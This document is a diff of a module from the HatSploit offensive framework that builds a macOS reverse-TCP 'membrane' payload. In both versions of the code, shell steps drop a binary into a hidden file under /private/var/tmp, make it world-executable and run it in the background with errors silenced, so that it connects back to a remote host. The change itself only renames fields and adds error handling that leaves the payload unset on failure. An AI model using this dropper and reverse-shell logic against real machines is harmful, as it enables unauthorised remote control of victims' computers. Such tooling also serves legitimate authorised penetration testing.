@@ -69,19 +69,23 @@ class HatSploitPayload(HatSploitPayload):
         remote_data = remote_data.decode()
 
         self.badges.output_process("Generating payload...")
-        binary = open(self.config.path_config['base_paths']['data_path'] + 'payloads/macos/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
-        payload = binary.read()
-        binary.close()
+        
+        try:
+            binary = open(self.config.path_config['base_paths']['data_path'] + 'payloads/macos/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
+            payload = binary.read()
+            binary.close()
+        except Exception:
+            self.badges.output_error("Failed to generate payload!")
 
-        execute = ""
-        execute += f"cat >/private/var/tmp/.payload;"
-        execute += f"chmod 777 /private/var/tmp/.payload;"
-        execute += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
-        execute += "\n"
+        instructions = ""
+        instructions += f"cat >/private/var/tmp/.payload;"
+        instructions += f"chmod 777 /private/var/tmp/.payload;"
+        instructions += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
+        instructions += "\n"
 
-        self.data['payload'] = payload
-        self.data['execute'] = execute
-        self.data['session'] = session
-        self.data['type'] = 'reverse_tcp'
+        self.method['Payload'] = payload
+        self.method['Instructions'] = instructions
+        self.method['Session'] = session
+        self.method['Type'] = 'reverse_tcp'
 
-        return self.data
+        return payload
